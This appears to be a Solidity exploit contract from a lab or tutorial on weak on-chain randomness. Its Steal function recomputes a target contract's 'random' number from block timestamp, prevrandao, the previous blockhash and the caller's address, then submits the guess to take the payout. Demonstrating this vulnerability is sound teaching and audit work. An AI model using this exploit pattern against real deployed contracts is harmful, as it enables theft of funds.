// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;
import {WeakRandomness} from "./WeakRandomness.sol";
import {console} from "forge-std/console.sol";
contract Attacker{
    receive() external payable{}

    function Steal(WeakRandomness weakRandomness) public {
        uint256 guess = uint256(keccak256(abi.encodePacked(address(this),block.timestamp,block.prevrandao,blockhash(block.number - 1))));
        console.log("guessed number:",guess);
        weakRandomness.guessRandomNumber(guess);
    }
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

}